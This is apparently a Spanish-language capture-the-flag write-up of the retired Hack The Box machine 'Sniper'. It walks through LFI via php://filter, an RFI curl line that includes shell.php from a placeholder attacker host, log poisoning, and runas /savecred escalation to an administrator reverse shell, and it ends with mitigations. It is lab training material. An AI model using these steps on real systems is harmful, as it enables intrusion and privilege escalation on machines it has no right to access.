---
machine: Sniper
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, lfi, rfi, smb, log-poisoning, runas, powershell]
---

# Sniper — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un parámetro `page` permite LFI/RFI en una web PHP. El LFI revela credenciales de un recurso SMB; el RFI y el log poisoning dan una shell. Un acceso guardado con `runas /savecred` permite ejecutar PowerShell como administrador.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p80,139,445 <IP>
```

La web usa `blog.php?page=home`. Se prueba traversal y wrappers:

```bash
curl 'http://sniper.htb/blog.php?page=php://filter/convert.base64-encode/resource=index'
```

Se enumeran recursos SMB con `smbclient` y `crackmapexec`.

## Acceso inicial

El LFI permite leer archivos de configuración y un recurso compartido con credenciales. Con ellas se accede a un share que contiene código PHP o un directorio escribible.

Si el RFI está habilitado, se aloja un PHP malicioso y se incluye:

```bash
curl 'http://sniper.htb/blog.php?page=http://<ATTACKER>/shell.php'
```

Como alternativa, se envenena un log accesible por LFI y se incluye la ruta del log. La shell corre como el usuario del servicio web.

## Movimiento lateral

Se enumeran usuarios y shares. Se encuentra un script o acceso guardado de `runas`:

```powershell
runas /savecred /user:Administrator cmd
```

`/savecred` reutiliza credenciales almacenadas sin pedir contraseña.

## Escalada a administrador

Con el acceso guardado se ejecuta PowerShell como administrador y se obtiene una reverse shell:

```powershell
runas /savecred /user:Administrator "powershell -c <payload>"
```

Se lee la flag de administrator y se redacta.

## Evidencia

- Respuesta del LFI con el archivo redactado.
- Share SMB y credenciales redactadas.
- Shell inicial.
- `runas /savecred` y shell de administrador.

## Lecciones aprendidas

- Un LFI puede revelar credenciales y código fuente.
- El RFI/log poisoning convierte el LFI en RCE.
- Los recursos SMB mal segmentados filtran secretos.
- `runas /savecred` es una escalada clásica en Windows.

## Mitigación y detección

- Evitar includes dinámicos y permitir solo rutas conocidas.
- Deshabilitar `allow_url_include`.
- Restringir SMB y auditar permisos de shares.
- Eliminar credenciales guardadas y limitar `runas`.

## Referencias

- <https://www.hackthebox.com/machines/sniper>
- <https://owasp.org/www-community/attacks/Path_Traversal>
- <https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/runas>
